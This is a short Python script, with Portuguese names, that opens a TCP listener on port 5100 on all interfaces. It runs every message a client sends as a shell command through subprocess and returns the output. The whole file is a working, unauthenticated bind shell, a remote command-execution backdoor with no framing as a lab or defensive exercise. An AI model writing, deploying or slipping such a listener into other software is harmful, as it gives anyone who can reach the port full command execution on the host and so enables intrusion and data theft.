import socket, os, subprocess

host = '127.0.0.1'
server_port = 5100  

def main():
	tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	tcp.bind(("",server_port))
	tcp.listen(1)
	connection_socket, addr = tcp.accept()
	conectado(connection_socket, addr)	
	tcp.close()

def conectado(con, cliente):
   print('\nCliente conectado:', cliente)
   while True:
    try: 
       msg = con.recv(1024)
       if not msg:
           break
       saida = subprocess.getstatusoutput(msg.decode())
       con.send(str(saida[1]).encode())
    except (KeyboardInterrupt, SystemExit):
      if(con != None):
        con.send('\x18'.encode())
        con.close()

   print('\nFinalizando conexao do cliente', cliente)

   con.close()

if __name__ == "__main__":
	main()


